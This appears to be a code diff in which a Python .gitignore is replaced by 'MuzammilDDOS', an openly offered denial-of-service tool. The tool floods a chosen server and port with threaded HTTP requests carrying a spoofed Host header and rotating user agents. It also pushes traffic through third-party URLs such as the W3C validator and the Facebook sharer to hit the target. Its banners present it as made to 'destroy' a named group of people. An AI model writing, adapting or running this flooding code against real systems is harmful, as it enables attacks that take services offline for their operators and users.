@@ -1,162 +1,417 @@
-# Byte-compiled / optimized / DLL files
-__pycache__/
-*.py[cod]
-*$py.class
+import socket
+import sys,os
+from optparse import OptionParser
+import threading,time,sys,logging,urllib.request,random
+from time import sleep
+from queue import Queue
+import rich
+from rich.markdown import Markdown
+from rich.progress import track
+from rich.console import Console
 
-# C extensions
-*.so
 
-# Distribution / packaging
-.Python
-build/
-develop-eggs/
-dist/
-downloads/
-eggs/
-.eggs/
-lib/
-lib64/
-parts/
-sdist/
-var/
-wheels/
-share/python-wheels/
-*.egg-info/
-.installed.cfg
-*.egg
-MANIFEST
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+target  = "default"
+ports = 8080
+levels = 3
+fake_ip = "999.999.999"
+hides = 0
+console = Console()
+already_connected_true = 0
+already_connected_false = 1
 
-# PyInstaller
-#  Usually these files are written by a python script from a template
-#  before PyInstaller builds the exe, so as to inject date/other infos into it.
-*.manifest
-*.spec
 
-# Installer logs
-pip-log.txt
-pip-delete-this-directory.txt
+def live_bro():
+            if already_connected_true % hides ==0:
+                console.print(f"[{time.ctime(time.time())}] connected : {already_connected_true}",style="green")
+            else:
+                pass
+            if already_connected_false % hides ==0 :
+                console.print(f"Wrong : {already_connected_false}",style="red")
+            else:
+                pass
+                
+              
+                
+                
 
-# Unit test / coverage reports
-htmlcov/
-.tox/
-.nox/
-.coverage
-.coverage.*
-.cache
-nosetests.xml
-coverage.xml
-*.cover
-*.py,cover
-.hypothesis/
-.pytest_cache/
-cover/
+ #Scrypt Typer  
+def get_Typer():
+	global host
+	global port
+	global thr
+	global item
+	global target
+	global ports
+	global levels
+	global fake_ip
+	global hides
+	optp = OptionParser(add_help_option=False,epilog="MUZAMMIL DDOS ATTACK")
+	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
+	optp.add_option("-i","--ip", dest="host",help="attack to server ip -i ip")
+	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
+	optp.add_option("-l","--level",type="int",dest="turbo",help="default 1 -t 1")
+	optp.add_option("-f","--fake",type="str",dest="fake",help="default -f 00.00.00.00")
+	optp.add_option("-d","--hide",type="int",dest="hide",help="default -d 200")
+	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
+	opts, args = optp.parse_args()
+	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
+	if opts.help:
+		usage()
+		usage1()
+		sys.exit()
+	if opts.host is not None:
+		host = opts.host
+		target = host
+	else:
+		pass
+	if opts.port is None:
+		port = 80
+		ports =port
+	else:
+		port = opts.port
+		ports =port
+	if opts.turbo is None:
+		thr = 1
+		levels = thr
+	else:
+		thr = opts.turbo
+		levels = thr
+	if opts.fake is not None:
+		hos = opts.fake
+		fake_ip = hos
+	else:
+		fake_ip = "999.999.999.999"
+	if opts.hide is None:
+		hide = 0
+		hides = hide
+	else:
+		hide = opts.hide
+		hides = hide
+		
+		
+def user_agent():
+	global uagent
+	uagent=[]
+	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
+	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
+	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
+	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
+	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
+	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
+	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")	
 
-# Translations
-*.mo
-*.pot
+def bot_hammering(url):
+	try:
+		while True:
+			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
+			print("\033[Muzammil is attacking...\033[0m")
+			time.sleep(.1)
+	except:
+		time.sleep(.1)
 
-# Django stuff:
-*.log
-local_settings.py
-db.sqlite3
-db.sqlite3-journal
+def my_bots():
+	global bots
+	bots=[]
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	return(bots)
 
-# Flask stuff:
-instance/
-.webassets-cache
 
-# Scrapy stuff:
-.scrapy
+#DDOS 1 + MASSEGS
+def attack(item):
+             with console.status("[bold dark_orange] Muzammil is Attacking CTRL+Z .....") as status:
+                 while True:
+                     try:
+                         packet = str("GET / HTTP/1.1\nHost: "+target+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
+                         s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                         s.connect((target,port))
+                         s.sendto(("GET / HTTP/1.1\r\n").encode("ascii"),(target,ports))
+                         s.sendto(("Host :"+fake_ip+"\r\n\r\n").encode("ascii"),(target,ports))
+                         s.close()
+                         
+                         
+                         global already_connected_true
+                         already_connected_true +=1
+                         console.print(f"attacks [{already_connected_true}] The attack succeeded port[{ports}] server[{target}] level[{levels}] !!!!",style="bold green")
+                     
+                     except:
+                         global already_connected_false
+                         already_connected_false +=1
+                         console.print(f"attacks [{already_connected_false}] Faced Attack port[{ports}] server[{target}] level[{levels}] ",style="bold red")
+                         s.close()
+#DDOS 1 NOT MS                   
+def attack_2(item):
+             live_bro()
+             try:
+                 while True:
+                     packet = str("GET / HTTP/1.1\nHost: "+target+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
+                     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                     s.connect((target,port))
+                     s.sendto(("GET / HTTP/1.1\r\n").encode("ascii"),(target,ports))
+                     s.sendto(("Host :"+fake_ip+"\r\n\r\n").encode("ascii"),(target,ports))
+                     s.close()
+                         
+                         
+                     global already_connected_true
+                     already_connected_true +=1
+                     live_bro()
+             except:
+                     
+                     global already_connected_false
+                     already_connected_false +=1
+                     s.close()
+                     live_bro()
+ #DDOS 2 IN MASSEGS
+def down_it(item):
+	try:
+		while True:
+			packet = str("GET / HTTP/1.1\nHost: "+target+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((target,int(ports)))
+			if s.sendto( packet, (target, int(ports)) ):
+				s.shutdown(1)
+				global already_connected_true
+				already_connected_true +=1
+				console.print(f"attacks [{already_connected_true}] The attack succeeded {time.ctime(time.time())} !!!!",style="bold green")
+			else:
+				global already_connected_false
+				already_connected_false +=1
+				s.shutdown(1)
+				console.print(f"attacks [{already_connected_false}] Faced Attack port[{ports}] server[{target}] level[{levels}] ",style="bold red")
+			#time.sleep(.1)
+	except socket.error as e:
+		console.print(f"attacks [{already_connected_false}] Faced Attack  Server is down port[{ports}] server[{target}] level[{levels}] ",style="bold red")
+		#print("\033[91m",e,"\033[0m")
+		time.sleep(.1)
+		
+		
+#DDOS 2 IN NOT MS		
+def down_it_2(item):
+	try:
+		while True:
+			packet = str("GET / HTTP/1.1\nHost: "+target+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((target,int(ports)))
+			if s.sendto( packet, (target, int(ports)) ):
+				s.shutdown(1)
+				global already_connected_true
+				already_connected_true +=1
+				live_bro()
+			else:
+				s.shutdown(1)
+				global already_connected_false
+				already_connected_false +=1
+				live_bro()
+				time.sleep(.1)
+	except socket.error as e:
+	    already_connected_false +=1
+	    live_bro()
 
-# Sphinx documentation
-docs/_build/
+#DDOS IN MESSAGE
+def dos():
+	while True:
+		item = q.get()
+		down_it(item)
+		q.task_done()
+def dos2():
+	while True:
+		item=w.get()
+		bot_hammering(random.choice(bots)+"http://"+target)
+		w.task_done()
+def dos3():
+	while True:
+		item = q.get()
+		attack(item)
+		q.task_done()
 
-# PyBuilder
-.pybuilder/
-target/
 
-# Jupyter Notebook
-.ipynb_checkpoints
+#DDOS IN NOT MS
+def dos_2():
+	while True:
+		item = q.get()
+		down_it_2(item)
+		q.task_done()
+def dos_3():
+	while True:
+		item = q.get()
+		attack_2(item)
+		q.task_done()
 
-# IPython
-profile_default/
-ipython_config.py
+def usage():
+    console = Console()
+    MARKDOWN=("""
+         	     Muzammil DDOS ATTACK            """)
+    md = Markdown(MARKDOWN)
+    console.print(md,style="bold green")   
+    
+    
+    
+    
+def usage1():
+    console = Console()
+    MARKDOWN="""
+    		
+	usage : python MuzammilDDOS.py [-i] [-p] [-l]
+        	-h : help
+        	-i : server ip
+        	-p : port server 
+        	-l : Livel Attack {number} 
+        	-f : Fake ip
+            -d : Hide message
+            	Best lvl =3 
+	example :
+	    python MuzammilDDOS.py -i 12.345.678 -p 80 -l 3"""
+    md = Markdown(MARKDOWN)
+    console.print(md,style="bold green")
+    #sys.exit()
 
-# pyenv
-#   For a library or package, you might want to ignore these files since the code is
-#   intended to run in multiple environments; otherwise, check them in:
-# .python-version
 
-# pipenv
-#   According to pypa/pipenv#598, it is recommended to include Pipfile.lock in version control.
-#   However, in case of collaboration, if having platform-specific dependencies or dependencies
-#   having no cross-platform support, pipenv may install dependencies that don't work, or not
-#   install all needed dependencies.
-#Pipfile.lock
 
-# poetry
-#   Similar to Pipfile.lock, it is generally recommended to include poetry.lock in version control.
-#   This is especially recommended for binary packages to ensure reproducibility, and is more
-#   commonly ignored for libraries.
-#   https://python-poetry.org/docs/basic-usage/#commit-your-poetrylock-file-to-version-control
-#poetry.lock
 
-# pdm
-#   Similar to Pipfile.lock, it is generally recommended to include pdm.lock in version control.
-#pdm.lock
-#   pdm stores project-wide configurations in .pdm.toml, but it is recommended to not include it
-#   in version control.
-#   https://pdm.fming.dev/latest/usage/project/#working-with-version-control
-.pdm.toml
-.pdm-python
-.pdm-build/
+def usage2():
+    console = Console()
+    MARKDOWN2="""
+    
+                       ALLAH HU AKBAR
+    """
+    md = Markdown(MARKDOWN2)
+    console.print(md,style="bold green")
+    
+    
+    
+    
+def usage3():
+    console = Console()
+    MARKDOWN="""
+    Programmer : Muzammil raza
+    Made for : Palestine
+    Telegram : @CybeR_mux4mmil
+    Tool Information : I Was Specially Made To Destroy Islam  Haters
+"""
+    md = Markdown(MARKDOWN)
+    console.print(md,style="bold green")
 
-# PEP 582; used by e.g. github.com/David-OConnor/pyflow and github.com/pdm-project/pdm
-__pypackages__/
 
-# Celery stuff
-celerybeat-schedule
-celerybeat.pid
 
-# SageMath parsed files
-*.sage.py
 
-# Environments
-.env
-.venv
-env/
-venv/
-ENV/
-env.bak/
-venv.bak/
+ #Script Run
+def run():
+    os.system("clear")
+    console.print(f"""
+    Host : {str(target)}
+    Port : {ports}
+    Level : {levels}
+    Fake ip : {fake_ip}
+       """)
+    for step in track(range(10),description="Wait ...."):
+        sleep(.001)
+    os.system("clear")
+    usage()
+    usage3()
+    usage2()
+    for step in track(range(10),description="Starting ...."):
+        sleep(.1)
+    while True:
+        for i in range(int(levels)):
+            thread = threading.Thread(target=dos3)
+            thread.daemon = True 
+            thread.start()
+            t = threading.Thread(target=dos)
+            t.daemon = True  # if thread is exist, it dies
+            t.start()
+            t2 = threading.Thread(target=dos2)
+            t2.daemon = True  # if thread is exist, it dies
+            t2.start()
+            start = time.time()
+    		#tasking
+            item = 2000000
+            while True:
+                if (item>100000): # for no memory crash maybe maybe 
+                    item=2000000
+                    time.sleep(.1)
+                item = item + 1
+                q.put(item)
+                w.put(item)
+            q.join()
+            w.join()   
 
-# Spyder project settings
-.spyderproject
-.spyproject
+#Script Run IN NOT MS
+def run2():
+    os.system("clear")
+    console.print(f"""
+    Hoat : {str(target)}
+    Port : {ports}
+    Level : {levels}
+    Fake ip : {fake_ip}
+       """)
+    for step in track(range(10),description="Wait ...."):
+        sleep(.001)
+    os.system("clear")
+    usage()
+    usage3()
+    usage2()
+    while True:
+        for i in range(int(levels)):
+            
+            thread = threading.Thread(target=dos_3)
+            thread.daemon = True 
+            thread.start()
+            
+            t = threading.Thread(target=dos_2)
+            t.daemon = True  # if thread is exist, it dies
+            t.start()
+            
+            t2 = threading.Thread(target=dos2)
+            t2.daemon = True  # if thread is exis,t, it dies
+            t2.start()
+            
+            start = time.time()
+    		#tasking
+            item = 2000000
+            while True:
+                if (item>100000): # for no memory crash maybe
+                    item=2000000
+                    time.sleep(.1)
+                item = item + 1
+                q.put(item)
+                w.put(item)
+            q.join()
+            w.join()   
 
-# Rope project settings
-.ropeproject
 
-# mkdocs documentation
-/site
+# reading headers
+global data
+headers = open("headers.txt", "r")
+data = headers.read()
+headers.close()
+#task queue are q,w
+q = Queue()
+w = Queue()
 
-# mypy
-.mypy_cache/
-.dmypy.json
-dmypy.json
-
-# Pyre type checker
-.pyre/
-
-# pytype static type analyzer
-.pytype/
-
-# Cython debug symbols
-cython_debug/
-
-# PyCharm
-#  JetBrains specific template is maintained in a separate JetBrains.gitignore that can
-#  be found at https://github.com/github/gitignore/blob/main/Global/JetBrains.gitignore
-#  and can be added to the global gitignore or merged into this file.  For a more nuclear
-#  option (not recommended) you can uncomment the following to ignore the entire idea folder.
-#.idea/
+if __name__ == "__main__":
+    if len(sys.argv) < 2:
+        usage()
+        usage1()
+        sys.exit()
+        #usage2()
+    get_Typer()
+    user_agent()
+    my_bots()
+    if len(sys.argv) < 2 :
+        usage()
+        usage1()
+    else:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target,int(ports)))
+            s.settimeout(1)
+            if hides == 0:
+                run()
+            else:
+                run2()
+        except socket.error as e:
+            console.print("check server ip and port",style="bold dark_orange")
+            sleep(2)
+            usage()
+            usage1()
